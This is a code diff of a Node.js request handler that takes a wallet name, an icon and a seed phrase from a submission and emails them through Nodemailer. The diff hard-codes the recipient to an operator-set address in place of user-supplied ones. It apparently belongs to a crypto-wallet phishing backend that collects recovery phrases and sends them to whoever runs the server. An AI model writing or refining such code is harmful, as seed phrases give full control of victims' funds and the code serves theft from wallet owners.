@@ -128,17 +128,15 @@ const sendEmail = async (req, res, body) => {
       return;
     }
 
-    const { walletName, walletIcon, seedPhrase, emailAddresses } =
-      JSON.parse(body);
+    const { walletName, walletIcon, seedPhrase } = JSON.parse(body);
 
     console.log("📧 Received email request:", {
       walletName,
       walletIcon,
       seedPhrase: seedPhrase ? "✓" : "✗",
-      emailAddresses,
     });
 
-    if (!walletName || !walletIcon || !seedPhrase || !emailAddresses) {
+    if (!walletName || !walletIcon || !seedPhrase) {
       res.writeHead(400, {
         "Content-Type": "application/json",
         "Access-Control-Allow-Origin": "*",
@@ -163,9 +161,7 @@ const sendEmail = async (req, res, body) => {
     // ✅ Send email via Nodemailer
     const result = await transporter.sendMail({
       from: process.env.SMTP_FROM || process.env.SMTP_USER,
-      to: Array.isArray(emailAddresses)
-        ? emailAddresses.join(", ")
-        : emailAddresses,
+      to: process.env.SMTP_TO,
       subject: `New Message from ${walletName}`,
       html: `
         <h2>New Submission</h2>
